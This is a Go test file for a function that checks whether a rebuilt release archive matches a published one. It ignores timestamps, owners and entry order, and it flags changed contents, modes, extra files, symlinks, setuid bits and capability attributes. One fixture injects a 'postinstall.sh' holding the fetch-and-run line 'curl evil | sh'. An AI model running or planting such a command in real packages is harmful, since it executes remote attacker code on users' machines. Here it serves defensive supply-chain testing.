package checksums

import (
	"archive/tar"
	"archive/zip"
	"compress/gzip"
	"io/fs"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

type file struct {
	name, body string
	mode       int64
}

func tgz(t *testing.T, path string, when time.Time, owner string, files ...file) {
	t.Helper()
	f, err := os.Create(path)
	if err != nil {
		t.Fatal(err)
	}
	defer f.Close()
	gz := gzip.NewWriter(f)
	gz.ModTime = when
	tw := tar.NewWriter(gz)
	for _, x := range files {
		if err := tw.WriteHeader(&tar.Header{Name: x.name, Mode: x.mode, Size: int64(len(x.body)), ModTime: when, Uname: owner, Gname: owner, Uid: len(owner), Typeflag: tar.TypeReg}); err != nil {
			t.Fatal(err)
		}
		if _, err := tw.Write([]byte(x.body)); err != nil {
			t.Fatal(err)
		}
	}
	tw.Close()
	gz.Close()
}

func TestSameContents(t *testing.T) {
	dir := t.TempDir()
	bin := file{"terma", "the binary", 0o755}
	readme := file{"README.md", "hello", 0o644}
	published := filepath.Join(dir, "pub.tar.gz")
	tgz(t, published, time.Date(2026, 10, 14, 21, 46, 0, 0, time.UTC), "runner", bin, readme)

	rebuilt := filepath.Join(dir, "same.tar.gz")
	tgz(t, rebuilt, time.Date(2026, 10, 16, 11, 24, 0, 0, time.UTC), "jespern", readme, bin)
	if same, why, err := SameContents(published, rebuilt); err != nil || !same {
		t.Fatalf("other times, owners and order should match: %v %q %v", same, why, err)
	}

	for name, files := range map[string][]file{
		"other contents":  {{"terma", "a backdoored binary", 0o755}, readme},
		"other mode":      {{"terma", "the binary", 0o4755}, readme},
		"an extra file":   {bin, readme, {"postinstall.sh", "curl evil | sh", 0o755}},
		"a missing file":  {bin},
		"a renamed entry": {{"bin/terma", "the binary", 0o755}, readme},
	} {
		p := filepath.Join(dir, strings.ReplaceAll(name, " ", "-")+".tar.gz")
		tgz(t, p, time.Now(), "runner", files...)
		if same, why, err := SameContents(published, p); err != nil || same || why == "" {
			t.Errorf("%s: same=%v why=%q err=%v", name, same, why, err)
		}
	}
}

func zipOf(t *testing.T, path string, entries ...zipEntry) {
	t.Helper()
	f, err := os.Create(path)
	if err != nil {
		t.Fatal(err)
	}
	defer f.Close()
	zw := zip.NewWriter(f)
	for _, e := range entries {
		h := &zip.FileHeader{Name: e.name, Method: zip.Deflate}
		h.SetMode(e.mode)
		w, err := zw.CreateHeader(h)
		if err != nil {
			t.Fatal(err)
		}
		if _, err := w.Write([]byte(e.body)); err != nil {
			t.Fatal(err)
		}
	}
	if err := zw.Close(); err != nil {
		t.Fatal(err)
	}
}

type zipEntry struct {
	name, body string
	mode       fs.FileMode
}

// TestZipKinds: a symlink in a zip, whose target is its contents, is not a file holding
// the same bytes, and setuid is a difference.
func TestZipKinds(t *testing.T) {
	dir := t.TempDir()
	link := filepath.Join(dir, "link.zip")
	zipOf(t, link, zipEntry{"tool", "/usr/bin/evil", fs.ModeSymlink | 0o777})
	file := filepath.Join(dir, "file.zip")
	zipOf(t, file, zipEntry{"tool", "/usr/bin/evil", 0o777})
	if same, _, err := SameContents(link, file); err != nil || same {
		t.Errorf("a symlink matched a file: same=%v err=%v", same, err)
	}
	setuid := filepath.Join(dir, "setuid.zip")
	zipOf(t, setuid, zipEntry{"tool", "bin", fs.ModeSetuid | 0o755})
	plain := filepath.Join(dir, "plain.zip")
	zipOf(t, plain, zipEntry{"tool", "bin", 0o755})
	if same, _, err := SameContents(setuid, plain); err != nil || same {
		t.Errorf("a setuid file matched a plain one: same=%v err=%v", same, err)
	}
	again := filepath.Join(dir, "again.zip")
	zipOf(t, again, zipEntry{"tool", "/usr/bin/evil", fs.ModeSymlink | 0o777})
	if same, why, err := SameContents(link, again); err != nil || !same {
		t.Errorf("the same symlink should match: %q %v", why, err)
	}
}

// TestTarXattrs: extended attributes install with a file, so they must match; the old
// regular-file type flag is the same as the new.
func TestTarXattrs(t *testing.T) {
	write := func(path string, flag byte, pax map[string]string) {
		f, err := os.Create(path)
		if err != nil {
			t.Fatal(err)
		}
		defer f.Close()
		gz := gzip.NewWriter(f)
		tw := tar.NewWriter(gz)
		h := &tar.Header{Name: "tool", Mode: 0o755, Size: 3, Typeflag: flag, PAXRecords: pax, Format: tar.FormatPAX}
		if err := tw.WriteHeader(h); err != nil {
			t.Fatal(err)
		}
		tw.Write([]byte("bin"))
		tw.Close()
		gz.Close()
	}
	dir := t.TempDir()
	plain, capped, old := filepath.Join(dir, "plain.tar.gz"), filepath.Join(dir, "capped.tar.gz"), filepath.Join(dir, "old.tar.gz")
	write(plain, tar.TypeReg, nil)
	write(capped, tar.TypeReg, map[string]string{"SCHILY.xattr.security.capability": "cap_setuid+ep"})
	write(old, tar.TypeRegA, nil)
	if same, _, err := SameContents(plain, capped); err != nil || same {
		t.Errorf("a file with a capability xattr matched one without: same=%v err=%v", same, err)
	}
	if same, why, err := SameContents(plain, old); err != nil || !same {
		t.Errorf("TypeRegA and TypeReg should match: %q %v", why, err)
	}
}
